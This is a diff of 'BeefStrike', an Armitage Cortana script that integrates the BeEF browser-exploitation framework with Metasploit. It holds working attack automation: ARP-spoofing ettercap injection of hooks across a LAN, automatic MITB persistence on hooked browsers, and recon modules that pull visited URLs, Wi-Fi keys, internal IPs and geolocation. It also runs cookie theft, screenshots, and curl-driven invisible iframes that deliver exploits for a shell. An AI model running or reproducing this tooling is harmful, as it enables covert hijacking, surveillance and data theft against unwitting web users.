@@ -1,253 +1,521 @@
-﻿# Beef & Armitage integration - by benyG
-# Tested on Bactrack5r3
-# video demo: http://www.youtube.com/watch?v=YhKhkYzq2s8&feature=share&list=UU7_xeQ_4d8jAMtxdJgikjlA
+############################ WARNING !!!##################################################
+##																 				        ##
+##		Before beginning to use this script, change all the 					        ##									 															  
+##	"import" lines ... Obviously you must put the right path for each Library. 			##
+##	But keep the lib folder (and his content) in the same folder than "BeefLib.jar"		##
+##																						##
+##  BeefStrike is a script for Beef and Armitage integration. May be you must read the  ##
+##						README file and watch Youtube video demo before use it  		##
+##															 						    ##				 				
+##	 >	@theBenyGreen < 			 													##													 																  
+##																 						##
+##########################################################################################
+import com.eyesopencrew.* from: C:\BeefLib\dist\BeefLib.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-lang-2.5.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-logging-1.1.3.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-beanutils-1.8.3.jar;
+import org.apache.commons.* from: C:\BeefLib\dist\lib\commons-collections-3.2.1.jar;
+import net.sf.json.* from:  C:\BeefLib\dist\lib\json-lib.jar;
+import net.sf.ezmorph.* from:  C:\BeefLib\dist\lib\ezmorph-1.0.6.jar;
 
-# At this time, This script doesn't use the beef_online command of beef metasploit plugin
-# to populate zombies list. But it try to reproduce host list. 
-# So if you try to add host while this script is running, you will falsify final result. 
-# Do your recruitment and Let Beef_strike add host for you. 
-#  
-# work in progress...
+################### CORE variables ###############################################
 
+global('@beef_hosts @beef_hostsoff @beef_cmde @beef_result $key');
+@beef_hosts = @(%());  # array of beef online zombies
+@beef_hostsoff = @(%());  # array of beef offline zombies
+@beef_cmde = @(%());  # array of beef commandes - list
+@beef_result = @(%());  # array of beef command result - list [NOT USE YET]
+$key = "000000000000000" ; # the MUCH important RESTful API key
+$recon = 1; # Auto recon status
+
+######################## Introduction ###########################################
 on ready {
-$console = console();
-$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
-cmd($console , "load beef");
-say("Beef_Strike script is running");
+	$console = console();
+	$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+	cmd($console , "load beef");
+	prompt($console, "\UBeEF\U >");
+	say("Beef_Strike is running");
 }
-
 on console_load {show_message("$3");
-		append($console, "\c5 /!\\ You may need to connect to BeEF Server");}
-# on console_beef_connect {show_message("$3");}
+	append($console, "\c5 /!\\ May be you will need to connect to BeEF Server ");
+	}
+on console_beef_connect {
+	show_message("$3 \n Copy and add your RESTful_API_Key (Token)"); 
+	}
 
-$first = 0 ;        # first beef's zombie id
-
-@beef_hosts = @(%());  # array of beef's zombies
-$key = "xxxxxxxxxxxxxxxx" ;
-# when zombie is offline icon must turn red.
-filter host_image {
-		$address = $2['address'];
-		push($1, script_resource("zombie.png")); 
-		return @_;
-		}
-
+#########################  BeEF  MENU BAR    ##############################
 popup attacks {
 	menu "BeEF Strike"{
-
-		item "Connect" {
+		menu "Start" {
+			item "Connect" {
 		# Default value of Auto-import & Client-side auto-recon.
-		$import = 1;
-		$recon = 1;
-		cmd($console , "beef_disconnect");
-	    $url = prompt_text("BeEF Server (with http://)","http://127.0.0.1:4000");
-		$user = prompt_text("User","beef");
-		$pass = prompt_text("Password","beef");
-		$key = prompt_text("RESTful API key","$key");
-		
-		cmd($console , "beef_connect $url $user $pass");
-		}
+			$import = 0;
+			$recon = 1;
+			cmd($console , "beef_disconnect");
+			$beefUrl = prompt_text("BeEF Server (with http://)","http://127.0.0.1:4000");
+			$user = prompt_text("User","beef");
+			$pass = prompt_text("Password","beef");
+			$connect = "curl -H \"Content-Type: application/json; charset=UTF-8\"  -X POST -d '{\"username\":\"$user\", \"password\":\"$pass\"}' " . $beefUrl . "/api/admin/login";
+			cmd($console , "$connect");
+			cmd($console , "beef_connect $beefUrl $user $pass");
+			
+			}
+			item " Key" {
+			$key = prompt_text("Copy and Paste RESTful_API_Key here","$key");
+			show_message("Well done, now turn ON Auto-Import option.");
+			}
+			}
 
 		menu "Recruitment" {
 #use ettercap filter for html injection - low injection success rate.
 			item "ettercap method" {
-			$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
-			$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
-			cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
-    			cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
-			show_message("ettercap filter > Contamination beging ...");
-				}
+					$eth0 = prompt_text("Network interface of the LAN to infect","eth0");
+					$filter = prompt_text("Put the absolute path of your filter","/opt/metasploit/msf3/data/armitage/cortana-scripts/beef_strike/infect.filter");
+					cmd_async(" xterm -e 'etterfilter $filter -o html.ef'");
+					cmd_async(" xterm -e 'ettercap -T -q -i $eth0 -F html.ef -M ARP // //'");
+					show_message("ettercap filter > Contamination beging ...");
+			}
 			item "mitmproxy method"{
-	# this feature will use iframe_injector script from mitmproxy to increase injection success rate.
-			show_message("Feature in dev.");
+	# this feature will use iframe_injector script from mitmproxy to increase injection success rate over a LAN.
+				show_message("Feature in dev.");
 				}
 	#  [recruitment method idea]
-	# xsser method for find xss vulns and auto add beef hooks.
-	# spear phishing campaign.
-		}
+	# xss scanning method: find xss vulns and inject beef hooks.
+	# spear phishing campaign
+	# Water-Hole / cloned web-site with your beef hook embeded.
+			}
 
 		item "Zombies" {
-		local('$zombitable');
-		$zombitable = open_table_tab("zombies", "", @("id", "address", "sessionID"), @(), @("Refresh"), "zmb_hook", 1);
-		refresh_hosts($zombitable);
-		}
-
+			local('$zombitableoff');
+			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
+			refresh_hostsoff($zombitableoff);
+			# two tab is open for Online and offline zombies.
+			local('$zombitable');
+			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh"), "zmb_hook", 1);
+			refresh_hosts($zombitable);
+			}
+		item "Beef Commands" {
+			local('$commandtab');
+			$commandtab = open_table_tab("Commandes", "", @("id","name","category"), @(), @("Fill_it"), "cmde_hook", 1);
+			fill_cmde_tab($commandtab);
+			}
 		menu "Auto import" {
-# import new zombies automatically in the metasploit database.
+# import new zombies in the metasploit database.
 			item "ON" {   
-		 append($console, "\c9 [*] Auto import enable");	                      			        $import = 1 ;
+				append($console, "\c9 [*] Auto import enable");
+				$import = 1 ;
 		        	}
 			item "OFF" {  
-	 	 append($console, "\c4 [*]  Auto import disable");	                       			        $import = 0 ;
+				append($console, "\c4 [*]  Auto import disable");
+				$import = 0 ;
 		        	}
-		}
+			}
 
-			menu "Client-side auto recon." {
-# Automatically drive client-side reconnaissance once a new zombie appear.
+		menu "Client-side auto recon." {
+#  drive client-side reconnaissance once a new zombie appear.
 			item "ON" { 
-                  append($console, "\c9 [*] Client-side auto recon. enable");	
-		        $recon = 1 ;
-		        	}
+				append($console, "\c9 [*] Client-side auto recon. enable");	
+				$recon = 1 ;
+				}
 			item "OFF" {  
-		  append($console, "\c4 [*] Client-side auto recon. disable");                 			        $recon = 0 ;
+				append($console, "\c4 [*] Client-side auto recon. disable"); 
+				$recon = 0 ;
 		        	}
 		}
-	
 		item "BeEF-Console" {
-		$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
-		cmd($console , "load beef");
-		cmd($console , "beef_connect $url $user $pass");
-		}
-
-		item "web UI panel" {
-		$urlpanel = "/ui/panel";
-		url_open("$url $+ $urlpanel");
-		}
-
+				$console = open_console_tab ("Beef Strike","all","zmb_hook",1);
+				cmd($console , "load beef");
+				cmd($console , "beef_connect $beefUrl $user $pass");
+				}
+		item "Web UI panel" {
+				$beefUrlpanel = "/ui/panel";
+				url_open("$beefUrl $+ $beefUrlpanel");
+				}
 		item "Disconnect" {
-		cmd($console , "beef_disconnect");
-		cmd($console , "load beef");
-		}
+				cmd($console , "beef_disconnect");
+				cmd($console , "load beef");
+			 }
 	}
 }
 
-
+# The heart beat of BeefStrike, specify the frequency of each update : zombie online and offline list, zombie importation
 on heartbeat_15s {
+	zombiupdate();
+	sleep(100);
 	if ( $import == 1 ) { 
-	cmd($console , "beef_import");
-#	cmd($console , "beef online");
-		} 
-	}
+	cmd($console , "beef_import");	} 
+   	}
 
+################### Menu of action to interact with each zombie #################
 popup zmb_hook {
-		menu "BeEF action" {
-		item "Information" { 
-		@idrz = flatten(table_selected($1, "id"));		
-		$idrz = @idrz[0]; 
-		@adrz = flatten(table_selected($1, "address"));		
-		$adrz = @adrz[0]; 
-	append($console, "+----------------------------------------------+");
-	append($console, "+--- \c7 zombie N° $idrz --> $adrz ---+");
-	append($console, "+----------------------------------------------+");
-                    
-		cmd($console , "beef_target -i $idrz");
-	append($console, "+----------------------------------------------+");
-# result of this function appear on teamserver console
-		# recon_result($idrz);
-	#append($console, "+----------------->  END  <--------------------+");
+			@idr = flatten(table_selected($1, "id"));
+			@adr = flatten(table_selected($1, "address"));
+			@sessidr = flatten(table_selected($1, "sessionID"));
+			$idr = @idr[0]; 
+			$adr = @adr[0];
+			$sessidr = @sessidr[0];
+		item "Informations" { 
+			zombi_info($sessidr);
 			}
-		item "Recon." {
-		@idrr = flatten(table_selected($1, "id"));		
-		$idrr = @idrr[0];                
-		driverecon($idrr);
-			 }
-		item "Drive-by" { 
-		   # add session ID manually
-		   @idrd = flatten(table_selected($1, "id"));		
-		   $idrd = @idr[0];   
- 		   @sessidr = flatten(table_selected($1, "sessionID"));		
-		   $sessidr = @sessidr[0];
-	                  
-			 if ( $sessidr == "empty" ) { 
-		$session_id = prompt_text("Session ID (Copy & paste cookie number)","$sessidr");
-		%selectedhost = @beef_hosts[$idrd];
-		%selectedhost["sessionID"] = $session_id;
-		run_driveby($url, $session_id, $key);
-				} else { run_driveby($url, $sessidr, $key); 
+		menu "Recon." {
+			item "Run." { driverecon($idr);}
+			item "See result" {recon_result($idr);}
+			}
+		menu "Attack" {
+			item "Drive-by" { run_driveby($beefUrl, $sessidr, $key);}
+			item "Raw JS" {	} 		
+	 		}
+		menu "Special" {
+			item "Get_cookie" {	#17
+				append($console , "Get all cookies of > " . $adr . "" );
+				send_beef_cmd_without_param($sessidr, 17);
+				sleep(500);
+				check_beef_cmd_result($sessidr, 17);
+				}
+			item "Screenshot" {#103
+				append($console , "Screenshot of > " . $adr . "" );
+				send_beef_cmd_without_param($sessidr, 103);
+				sleep(500);
+				check_beef_cmd_result($sessidr, 103);
+				}
+			menu "Geolocation" { #110
+					item "Satellite type" {
+					append($console , "Geolocate > " . $adr . "" );
+					send_beef_cmd_without_param($sessidr, 110);
+					sleep(500);
+					check_beef_cmd_result($sessidr, 110);
+					$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
+					$maptype = "satellite";
+					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+					geomap($json_freegeoip, $maptype);
 					}
-	 			}
-			}	
-	}
+					item "Roadmap type" {
+					append($console , "Geolocate > " . $adr . "" );
+					send_beef_cmd_without_param($sessidr, 110);
+					sleep(500);
+					check_beef_cmd_result($sessidr, $idcmde);
+					$freegeoip_url = "http://freegeoip.net/json/" . $adr . "";
+					$maptype = "roadmap";
+					$json_freegeoip = [BeefRequester BeefGetRequest: "$freegeoip_url"];
+					geomap($json_freegeoip, $maptype);
+					}		
+				}
+			item "Send command with ID " { 
+				append($console , "Send Command ID to >" . $adr . "" );
+				$idcmde = prompt_text("Command ID","27");
+				send_beef_cmd_without_param($sessidr, $idcmde);
+				sleep(500);
+				check_beef_cmd_result($sessidr, $idcmde);
+				%result = %(command_ID => $idcmde, sessionID => "$session");
+				@beef_result[$i] = %result;
+				}
+			}
+		item "Unhook" {
+				append($console , "Unhook : " . $idr . " -> kill the zombie" );
+				send_beef_cmd_without_param($sessidr, 105);
+		}
+	}	
+# This function send beEF command without parameter !
+sub send_beef_cmd_without_param {
+			$link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "?token=$key";
+			$send_url = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{}' -X POST " . $link . "";
+			cmd($console , "$send_url");
+			}
 
+sub check_beef_cmd_result {
+# Only the first command ID for the moment
+			$link = "" . $beefUrl . "/api/modules/" . $1 . "/" . $2 . "/1?token=$key";
+			$send_url = "curl " . $link . "";
+			append($console, "\c9 [*] Result of module ID $2 ");
+			cmd($console , "$send_url");
+			}			
+	
 sub refresh_hosts {
 	table_set($1, @beef_hosts);
 	}
-
+	
+sub refresh_hostsoff {
+	table_set($1, @beef_hostsoff);
+}
 on tab_table_click {
 	if ($3 eq "Refresh") {
 		refresh_hosts($1);
 	}
+	if ($3 eq "RefreshOFF") {
+		refresh_hostsoff($1);
+	}
+	if ($3 eq "Fill_it") {
+		fill_cmde_tab($1);
+	}
 }
 
+# Perform action once a new zombie appear	
 on host_add {
-	# try to build result of beef_online command.
-	$sessid = "empty";
-	%newhost = %(id => $first, address => "$1", sessionID => "$sessid");
-	
-	$id = %newhost["id"];
-	$ad = %newhost["address"];
-	show_message("new zombie > Id: $id -- IP: $ad");
-	add(@beef_hosts, %newhost, $first);
-	append($console, "\c9 Send MiTB module for Persistence ------->");	
+	if ($key ne "000000000000000" ){ 
+	show_message("new zombie > IP: $1");
+	zombiupdate();
+	sleep(200);
+	$id = size(@beef_hosts);
+	$id = $id - 1 ;
+	append($console, "\c9 Send MiTB module for Persistence ------>");	
 	cmd($console , "beef_target -e $id 32"); # MITB Persistence
-#	cmd($console , "beef_target -e $id 30"); # POP-Under Persistence
-	# feel free to add another persistence module here. 
-
-# Drive or not drive auto recon that's the question .
+# cmd($console , "beef_target -e $id 30"); # POP-Under Persistence
+# Feel free to add another persistence module here. 
 	if ( $recon == 1 ) { 
-	# BeEF recon modules deployment
-	driverecon($first);
+# BeEF auto recon modules deployment
+	driverecon($id);
 	} else {
 	append($console, "[*]\cB Client-side auto recon. have been disabled \n Drive or not drive auto recon ? that's the question");
 	}
-     $first = $first + 1 ; 
+	}else{show_message("Hey ? What do you do ? \n You must configure your RESTful API key ! ");}
 }
-
-
+# This action launch beef recon modules again a target
 sub driverecon {
-	append($console, "[*]\cB Send client-side recon. modules ------------>");	
-	cmd($console , "beef_target -e $1 101"); # fingerprint browser
-	cmd($console , "beef_target -e $1 94"); # replace https hrefs by http
-	cmd($console , "beef_target -e $1 78"); # get visited domains
-	cmd($console , "beef_target -e $1 79"); # get visited URLs
-	cmd($console , "beef_target -e $1 107"); # get physical location
-	cmd($console , "beef_target -e $1 108"); # get location using location API
-	cmd($console , "beef_target -e $1 115"); # get internal IP (behind NAT)
-	cmd($console , "beef_target -e $1 110"); # get system information
-	cmd($console , "beef_target -e $1 113"); # detect installed software (IE only)
+	append($console, "[*]\cB Start System Profiling via Client-side recon modules --->");	
+	cmd($console , "beef_target -e $1 102"); # fingerprint browser
+	cmd($console , "beef_target -e $1 95"); # replace https hrefs by http
+	cmd($console , "beef_target -e $1 79"); # get visited domains
+	cmd($console , "beef_target -e $1 80"); # get visited URLs
+	cmd($console , "beef_target -e $1 107"); # get Wireless keys 
+	cmd($console , "beef_target -e $1 110"); # get location using location API
+	cmd($console , "beef_target -e $1 117"); # get internal IP (behind NAT)
+	cmd($console , "beef_target -e $1 112"); # get system information
+	cmd($console , "beef_target -e $1 115"); # detect installed software (IE only)
 	append($console, "\cB (!) BeEF say \"Command not send\", don't pay attention.");
 # feel free to add another module here to build complete user and system profile ;-)
+	say("Run BeEF based system profiling again " . $1 . "");
 }
-
+# this action show the result of recon modules
 sub recon_result {
 	append($console, "[*]\c1 Recon. result ------------>");	
 	append($console, ">\c8 fingerprint browser ");	
 	cmd($console , "beef_target -r $1 101"); # fingerprint browser
 	append($console, ">\c8 replace https hrefs by http ");	
-	cmd($console , "beef_target -r $1 94"); # replace https hrefs by http
+	cmd($console , "beef_target -r $1 95"); # replace https hrefs by http
 	append($console, ">\c8  get visited domains");	
-	cmd($console , "beef_target -r $1 78"); # get visited domains
+	cmd($console , "beef_target -r $1 79"); # get visited domains
 	append($console, ">\c8 get visited URLs");	
-	cmd($console , "beef_target -r $1 79"); # get visited URLs
-	append($console, ">\c8 get physical location");	
-	cmd($console , "beef_target -r $1 107"); # get physical location
+	cmd($console , "beef_target -r $1 80"); # get visited URLs
+	append($console, ">\c8 get Wireless keys");	
+	cmd($console , "beef_target -r $1 107"); # get Wireless keys 
 	append($console, ">\c8 get location using location API ");	
-	cmd($console , "beef_target -r $1 108"); # get location using location API
+	cmd($console , "beef_target -r $1 110"); # get location using location API
 	append($console, ">\c8 get internal IP (behind NAT) ");	
-	cmd($console , "beef_target -r $1 115"); # get internal IP (behind NAT)
+	cmd($console , "beef_target -r $1 117"); # get internal IP (behind NAT)
 	append($console, ">\c8 get system information");	
-	cmd($console , "beef_target -r $1 110"); # get system information
+	cmd($console , "beef_target -r $1 112"); # get system information
 	append($console, ">\c8 detect installed software (IE only)");	
-	cmd($console , "beef_target -r $1 113"); # detect installed software (IE only)
+	cmd($console , "beef_target -r $1 115"); # detect installed software (IE only)
 	append($console, "\c8 :-)");
 }
 
+on console_beef_target {append($console, "$3");}
+
+# this action show an info box with details about a particular zombie
+sub zombi_info {
+	$link = "" . $beefUrl . "/api/hooks/" . $1 . "?token=" . $key . "";
+	$details = [BeefRequester BeefGetRequest: "$link"];
+	$js = [new JSONObject];
+	$js = [JSONSerializer toJSON: "$details"];
+   $BrowserName = [[$js get: "BrowserName"] toString];
+   $BrowserPlugins = [[$js get: "BrowserPlugins"] toString];
+   $BrowserReportedName = [[$js get: "BrowserReportedName"] toString];
+   $BrowserType = [[$js get: "BrowserType"] toString];
+   $BrowserVersion = [[$js get: "BrowserVersion"] toString];
+   $HasActiveX = [[$js get: "HasActiveX"] toString];
+   $HasFlash = [[$js get: "HasFlash"] toString];
+   $HasGoogleGears = [[$js get: "HasGoogleGears"] toString];
+   $HasWebSocket = [[$js get: "HasWebSocket"] toString];
+   $HostName = [[$js get: "HostName"] toString];
+   $JavaEnabled = [[$js get: "JavaEnabled"] toString];
+   $OsName = [[$js get: "OsName"] toString];
+   $SystemPlatform = [[$js get: "SystemPlatform"] toString];
+   $VBScriptEnabled = [[$js get: "VBScriptEnabled"] toString];
+   
+	show_message( "BrowserName: " . $BrowserName . "\n +--------------------------------------------------+\n BrowserPlugins: " . $BrowserPlugins . "\n BrowserReportedName: " . $BrowserReportedName . "\nBrowserType: " . $BrowserType . "\n BrowserVersion: " . $BrowserVersion . "\n +--------------------------------------------------+\n HasActiveX: " . $HasActiveX . "\n HasFlash: " . $HasFlash . "\n HasGoogleGears: " . $HasGoogleGears . "\n HasWebSocket: " . $HasWebSocket . "\n HostName: " . $HostName . "\n JavaEnabled: " . $JavaEnabled . "\n OsName: " . $OsName . "\n SystemPlatform: " . $SystemPlatform . "\n VBScriptEnabled: " . $VBScriptEnabled . "\n +--------------------------------------------------+");
+	append($console, "+----------------------------------------------+");
+	# result of this function appear on teamserver console
+		# recon_result($1);
+	#append($console, "+----------------->  END  <--------------------+");
+}
+
+#################################### GIVE ME MY SHELL ! ###########################
+# I love this action, it send invisible iframe to your target so easily that you can play with client-side exploit like you do with remote exploit. :-D awesome !
 sub run_driveby {
 	# Send invisible iframe to victim browser using sesion ID and RESTfull_API key
 	$inviframe = prompt_text("URL (with http://)","http://");
 	$link = "" . $1 . "/api/modules/" . $2 . "/27?token=$3";
-#	println($link);
 	$attak = "curl -H \"Content-Type: application/json; charset=UTF-8\" -d '{\"target\":\"$inviframe\"}' -X POST " . $link . "";
-	println($attak);
-	append($console, "\c4 --> Send invisible iframe");
+	append($console, "\c4 --> Come here baby !");
+	append($console , "Send invisible iframe : " . $inviframe . " --> " . $ . "" );
 	cmd($console , "$attak");
+	say("Send invisible iFrame: " . $inviframe . " via Beef_Strike ");
 	}
 
-# on console_beef_online{
-# 	@online = parse_table($3, @("Id", "IP", "OS"));
-#  	println(@online);
-# 	append($console, "@online");
-# 	foreach $nReports (@online) {
-# 		($Id, $IP, $OS) = values($online, @('Id', 'IP', 'OS'));
-# 		show_message($Id);
-# 		}
-# }
+# This action try to keep your zombie list up to date inside Armitage
+sub zombiupdate {
+	$hooks_list_link = "" . $beefUrl . "/api/hooks?token=" . $key . "";
+	println($hooks_list_link);
+	$jsonTxt = [BeefRequester BeefGetRequest: "$hooks_list_link"];
+	
+	clear(@beef_hosts);
+	$on = [OnlineClass extractOnline: $jsonTxt ];
+	 
+	for ($i = 0; $i < [$on size]; $i++)   {
+    
+		$id = $i ;
+		$ip = [OnlineClass extractZombieData: $jsonTxt, $i, "ip"]; 
+		$name = [OnlineClass extractZombieData: $jsonTxt, $i, "name"];  
+		$version = [OnlineClass extractZombieData: $jsonTxt, $i, "version"]; 
+		$os = [OnlineClass extractZombieData: $jsonTxt, $i, "os"];  
+		$platform = [OnlineClass extractZombieData: $jsonTxt, $i, "platform"]; 
+		$domain = [OnlineClass extractZombieData: $jsonTxt, $i, "domain"]; 
+		$port = [OnlineClass extractZombieData: $jsonTxt, $i, "port"]; 
+		$page_uri = [OnlineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
+		$session = [OnlineClass extractZombieData: $jsonTxt, $i, "session"];
+		%hoston = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
+		@beef_hosts[$i] = %hoston;	
+		}
+	
+#JSON Processing ---- OFFLINE ZOMBIES -----* * *------------------
+	clear(@beef_hostsoff);
+	$off = [OfflineClass extractOffline: $jsonTxt ];
+	for ($i = 0; $i < [$off size]; $i++)   {
+    
+		$id = $i ;
+		$ip = [OfflineClass extractZombieData: $jsonTxt, $i, "ip"]; 
+		$name = [OfflineClass extractZombieData: $jsonTxt, $i, "name"];  
+		$version = [OfflineClass extractZombieData: $jsonTxt, $i, "version"]; 
+		$os = [OfflineClass extractZombieData: $jsonTxt, $i, "os"];  
+		$platform = [OfflineClass extractZombieData: $jsonTxt, $i, "platform"]; 
+		$domain = [OfflineClass extractZombieData: $jsonTxt, $i, "domain"]; 
+		$port = [OfflineClass extractZombieData: $jsonTxt, $i, "port"]; 
+		$page_uri = [OfflineClass extractZombieData: $jsonTxt, $i, "page_uri"]; 
+		$session = [OfflineClass extractZombieData: $jsonTxt, $i, "session"];
+		%hostoff = %(id => $id, ip => "$ip", name => "$name", version => "$version", OS => "$os", platform => "$platform", domain => "$domain", port => "$port", URI => "$page_uri", sessionID => "$session");
+		@beef_hostsoff[$i] = %hostoff;	
+		}
+}
+
+###################   JSON Processing ---- BEEF COMMANDS ---- #####################
+
+sub fill_cmde_tab {
+	fill();
+	sleep(500);
+	table_set($1, @beef_cmde);
+	}
+
+popup cmde_hook {
+			@idr = flatten(table_selected($1, "id"));
+			$idr = @idr[0];
+			item "Informations" { 
+			cmde_info($idr);
+			}
+}
+
+sub cmde_info {
+	$link2 = "" . $beefUrl . "/api/modules/" . $1 . "?token=" . $key . "";
+	$cmdeid = [BeefRequester BeefGetRequest: "$link2"];
+	$jsoncmdeinfo = [new JSONObject];
+	$jsoncmdeinfo = [JSONSerializer toJSON: "$cmdeid"];
+   $name = [[$jsoncmdeinfo get: "name"] toString];
+   $description = [[$jsoncmdeinfo get: "description"] toString];
+   $options = [[$jsoncmdeinfo get: "options"] toString];
+   	show_message( "Name: " . $name . "\n +-------------------------+\n Description: " . $description . "\n Options: " . $options . "\n +-----------------------+");
+	}
+
+sub fill {
+	$cmd_list_link = "" . $beefUrl . "/api/modules?token=" . $key . "";
+	$jsonTxt_cmde = [BeefRequester BeefGetRequest: "$cmd_list_link"];
+   $c = [CommandList extractCommands: $jsonTxt_cmde] ;
+	for ($i = 0; $i < [$c size]; $i++)   {
+		$id = [CommandList extractcmdData: $jsonTxt_cmde, $i, "id"]; 
+		$name = [CommandList extractcmdData: $jsonTxt_cmde, $i, "name"];  
+		$category = [CommandList extractcmdData: $jsonTxt_cmde, $i, "category"]; 
+		%cmde = %(id => "$id", name => "$name", category => "$category");
+		@beef_cmde[$i] = %cmde;	
+	}
+}
+###########################  HOST Sub-Menu ###########################
+popup host_bottom {
+	item "BeEF" {local('$zombitableoff');
+			$zombitableoff = open_table_tab("zombies-OFF", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("RefreshOFF"), "zmb_hookoff", 1);
+			refresh_hostsoff($zombitableoff);
+			# two tab is open for Online and offline zombies.
+			local('$zombitable');
+			$zombitable = open_table_tab("zombies", "", @("id", "ip","name","version","OS","platform", "domain", "port", "URI", "sessionID"), @(), @("Refresh"), "zmb_hook", 1);
+			refresh_hosts($zombitable);
+			}
+}
+
+######################## HOST ICON ###################################
+# when zombie is offline icon will turn red. This filter show you the browser hooked icon
+filter host_image {
+	local('$ip $ipoff');
+	$address = $2['address'];
+# Blue beef ICON for online zombie
+
+	for ($i = 0; $i < size(@beef_hostsoff); $i++ ) {
+		%hostoff = @beef_hostsoff[$i];
+		$ipoff = %hostoff['ip'];
+		$nameoff = %hostoff['name'];
+		if ($ipoff eq $address ){
+				push($1, script_resource("zombieoff.png"));
+				break;
+			}
+	}
+	for ($i = 0; $i < size(@beef_hosts); $i++ ) {
+		%host = @beef_hosts[$i];
+		$ip = %host['ip'];
+		$name = %host['name'];
+		if ($ip eq $address ){
+				push($1, script_resource("zombie.png"));
+				if ($name eq "IE"){
+				push($1, script_resource("iexplorer_hk.png"));
+				#break;
+				} 
+				if ($name eq "FF"){
+				push($1, script_resource("firefox_hk.png"));
+				#break;
+				}
+				if ($name eq "C"){
+				push($1, script_resource("chrome_hk.png"));
+				#break;
+				}
+				if ($name eq "O"){
+				push($1, script_resource("opera_hk.png"));
+				#break;
+				}
+				if ($name eq "S"){
+				push($1, script_resource("safari_hk.png"));
+				#break;
+				}
+				if ($name eq "UN"){
+				push($1, script_resource("unknow_hk.png"));
+				#break;
+				}# break ;
+			}
+		}
+	return @_;
+}
+
+######################## GEOLOCATE  ZOMBIE ##################################
+# 	Use freegeoip.net web services 	   --------------------------------
+sub geomap {
+	$js = [new JSONObject];
+	$js = [JSONSerializer toJSON: "$1"];
+   $ip = [[$js get: "ip"] toString];
+   $country = [[$js get: "country_name"] toString];
+   $city = [[$js get: "city"] toString];
+   $lat = [[$js get: "latitude"] toString];
+   $lon = [[$js get: "longitude"] toString];
+   $map_url = "http://maps.google.com/maps/api/staticmap?size=512x512&center=" . $lat . "," . $lon . "&maptype=" . $2 . "&zoom=13&sensor=false"
+   url_open("$map_url"); # IN USE BEFORE FINISH THE IMAGE TAB
+   
+   #   $map_tab = open_image_tab("Map", $arg, @("Satellite", "Roadmap"));
+ #  set_image($map_tab, "$map_url");
+}
+
+on tab_image_click {
+	# NOT IMPLEMENTED YET
+}
